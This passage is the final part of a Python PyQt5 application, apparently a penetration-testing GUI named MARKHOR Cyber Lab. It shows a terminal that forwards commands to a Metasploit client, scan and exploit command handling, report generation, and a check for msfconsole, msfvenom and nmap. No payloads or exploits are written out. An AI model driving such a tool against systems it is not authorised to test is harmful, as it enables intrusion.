            self.show_notification("Web server stopped")
            
    def update_system_status(self, metrics: dict):
        """Update system status display"""
        # Update dashboard metrics
        if hasattr(self, 'dashboard_msf_status') and self.dashboard_msf_status:
            cpu_text = f"CPU: {metrics['cpu_percent']}%"
            mem_text = f"Memory: {metrics['memory_percent']}%"
            
            # Update dashboard if visible
            if self.content_stack.currentIndex() == 0:
                self.dashboard_msf_status.setText(f"CPU: {metrics['cpu_percent']}% | Mem: {metrics['memory_percent']}%")
                
        # Update status bar
        self.status_label.setText(f"CPU: {metrics['cpu_percent']}% | Mem: {metrics['memory_percent']}%")
        
        # Update MSF status in system monitor
        if not metrics.get('msf_running', True) and self.msf_client.connected_flag:
            self.msf_status.setText("🔴 Metasploit: Process not found")
            self.msf_status.setStyleSheet("color: #ff4444;")
            
    def execute_terminal_command(self, command: str):
        """Execute command from custom terminal"""
        self.log_output(f"> {command}")
        
        # Handle special commands
        if command.lower() == "clear":
            self.terminal_dock.clear()
        elif command.lower().startswith("sessions"):
            self.msf_client.list_sessions()
        elif command.lower().startswith("help"):
            self.terminal_dock.append("Available commands: sessions, clear, help, scan <target>, exploit")
        elif command.lower().startswith("scan"):
            parts = command.split()
            if len(parts) >= 2:
                target = parts[1]
                self.start_scan("quick")
            else:
                self.terminal_dock.append("[!] Usage: scan <target>")
        else:
            # Send to Metasploit
            self.msf_client.execute_command(command)
            
    def closeEvent(self, event):
        """Handle application close with all cleanup"""
        self.log_manager.info("Shutting down MARKHOR Forge")
        
        # Stop web server if running
        if hasattr(self, 'web_server_running') and self.web_server_running:
            self.web_server.stop()
            
        # Stop system monitor
        self.system_monitor.stop()
        self.system_monitor.wait()
        
        # Stop Metasploit client
        self.msf_client.stop()
        
        # Generate final report if assessment exists
        if self.current_assessment_id:
            try:
                filename = f"assessment_{self.current_assessment_id}_{datetime.now().strftime('%Y%m%d')}.html"
                self.report_generator.generate_html(filename)
                self.log_manager.info(f"Final report saved: {filename}")
            except:
                pass
                
        # Log shutdown
        self.log_manager.info("Application shutdown complete")
        self.log_manager.stop()
        
        event.accept()



def main_final():
    """Final application entry point with complete error handling and setup"""
    
    # Parse command line arguments
    import argparse
    
    parser = argparse.ArgumentParser(description=f"{APP_NAME} - Professional Penetration Testing GUI")
    parser.add_argument('--no-splash', action='store_true', help='Disable splash screen')
    parser.add_argument('--debug', action='store_true', help='Enable debug logging')
    parser.add_argument('--config', type=str, help='Configuration file path')
    
    args = parser.parse_args()
    
    # Set debug level
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)
        
    # Create application
    app = QApplication(sys.argv)
    app.setApplicationName(APP_NAME)
    app.setApplicationVersion(APP_VERSION)
    
    # Set application-wide stylesheet for all widgets
    app.setStyleSheet("""
        QToolTip {
            background-color: #1e1e1e;
            color: #00ff00;
            border: 1px solid #00ff00;
        }
        QScrollBar:vertical {
            background-color: #1e1e1e;
            width: 12px;
            border-radius: 6px;
        }
        QScrollBar::handle:vertical {
            background-color: #00ff00;
            border-radius: 6px;
            min-height: 20px;
        }
        QScrollBar:horizontal {
            background-color: #1e1e1e;
            height: 12px;
            border-radius: 6px;
        }
        QScrollBar::handle:horizontal {
            background-color: #00ff00;
            border-radius: 6px;
            min-width: 20px;
        }
        QSplitter::handle {
            background-color: #00ff00;
        }
    """)
    
    # Show splash screen if enabled
    if not args.no_splash:
        splash = SplashScreen()
        splash.show()
        
        # Create main window with delay
        main_window = MarkhorCyberLab()
        
        # Load config if provided
        if args.config and Path(args.config).exists():
            try:
                with open(args.config, 'r') as f:
                    config = json.load(f)
                # Apply config (simplified)
                main_window.log_manager.info(f"Loaded config from {args.config}")
            except Exception as e:
                print(f"Failed to load config: {e}")
                
        # Center window
        screen = QApplication.primaryScreen().geometry()
        main_window.resize(1400, 900)
        main_window.move(
            screen.center().x() - main_window.width() // 2,
            screen.center().y() - main_window.height() // 2
        )
        
        # Show after splash
        QTimer.singleShot(2500, splash.close)
        QTimer.singleShot(2600, main_window.show)
        
    else:
        # No splash, show immediately
        main_window = MarkhorCyberLab()
        main_window.show()
        
    # Run application
    try:
        sys.exit(app.exec_())
    except Exception as e:
        print(f"\033[91m[FATAL] Application error: {str(e)}\033[0m")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    print("\033[95m" + "="*70 + "\033[0m")
    print("\033[92m" + ASCII_LOGO + "\033[0m")
    print(f"\033[96m{APP_NAME} v{APP_VERSION}\033[0m")
    print(f"\033[93m{AUTHOR_TAG}\033[0m")
    print(f"\033[91m{SAFETY_NOTICE}\033[0m")
    print("\033[95m" + "="*70 + "\033[0m")
    
    # System information
    print(f"\n\033[96mSystem Information:\033[0m")
    print(f"  Python: {sys.version.split()[0]}")
    print(f"  Platform: {sys.platform}")
    print(f"  Working Directory: {os.getcwd()}")
    
    # Check for required tools with detailed output
    print(f"\n\033[96mChecking Dependencies:\033[0m")
    
    dependencies = {
        "msfconsole": {
            "required": False,
            "description": "Metasploit Framework console",
            "url": "https://www.metasploit.com/"
        },
        "msfvenom": {
            "required": False, 
            "description": "Payload generator",
            "url": "https://www.metasploit.com/"
        },
        "nmap": {
            "required": False,
            "description": "Network scanner",
            "url": "https://nmap.org/"
        }
    }
    
    missing_tools = []
    for tool, info in dependencies.items():
        if shutil.which(tool):
            print(f"  \033[92m✓ {tool}\033[0m - {info['description']}")
        else:
            print(f"  \033[91m✗ {tool}\033[0m - {info['description']} (optional)")
            missing_tools.append(tool)
            
    if missing_tools:
        print(f"\n\033[93m[INFO] Some optional tools are missing. The application will still run but some features may be limited.\033[0m")
        print(f"      Install missing tools for full functionality.")
        
    print(f"\n\033[96mChecking Python Packages:\033[0m")
    
    packages = {
        "PyQt5": "GUI Framework",
        "psutil": "System monitoring"
    }
    for package, desc in packages.items():
        try:
            __import__(package.replace('-', '_'))
            print(f"  \033[92m✓ {package}\033[0m - {desc}")
        except ImportError:
            print(f"  \033[91m✗ {package}\033[0m - {desc} (MISSING - install with: pip install {package})")
            
    print(f"\n\033[92mStarting MARKHOR Cyber Lab...\033[0m\n")
    
    main_final()